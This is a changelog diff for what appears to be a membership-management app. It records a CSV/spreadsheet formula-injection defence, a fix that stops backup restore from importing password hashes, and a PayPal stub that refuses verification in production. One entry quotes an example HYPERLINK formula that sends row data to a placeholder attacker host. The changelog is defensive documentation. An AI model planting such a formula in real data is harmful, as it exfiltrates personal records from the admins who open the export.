@@ -8,6 +8,23 @@ Format: `## [version] — YYYY-MM-DD` with bullet points per change.
 ## [Unreleased] — 2026-06-10
 
 ### Security
+- **CSV / spreadsheet formula injection defence** — new helper
+  `utils/spreadsheet.js` (`sanitizeCell`, `sanitizeRowForExport`) prefixes
+  any string starting with `=`, `+`, `-`, `@`, tab or CR with a single
+  quote so Excel/Calc/Sheets treat it as a literal. Applied to every
+  Excel/CSV export sink: full tenant backup (`backup.js`), member
+  download, group/team/calendar/gift-aid downloads, finance and groups
+  statements, address export (CSV/TSV/Excel), SQL Reports download, and
+  membership-card data export. Without this, a member named e.g.
+  `=HYPERLINK("http://attacker/?c="&A2,"click")` could exfiltrate the
+  row when an admin opened the daily backup.
+- **Restore no longer imports `password_hash` from the backup file** —
+  `routes/backup.js:restoreBeacon2`. A malicious backup could otherwise
+  plant a known-password account bound to Administration via the User
+  roles sheet. Imported users now have NULL `password_hash`; the
+  sys-admin must use "Set temporary password for all users" on the
+  tenant before they can log in. The legacy Beacon-format restore path
+  already used this pattern.
 - **PayPal stub refuses to verify in production** — `utils/paypal.js`
   `verifyPaymentNotification()` now returns `verified: false` when
   `NODE_ENV === 'production'` unless `PAYPAL_STUB_ALLOW=true` is explicitly
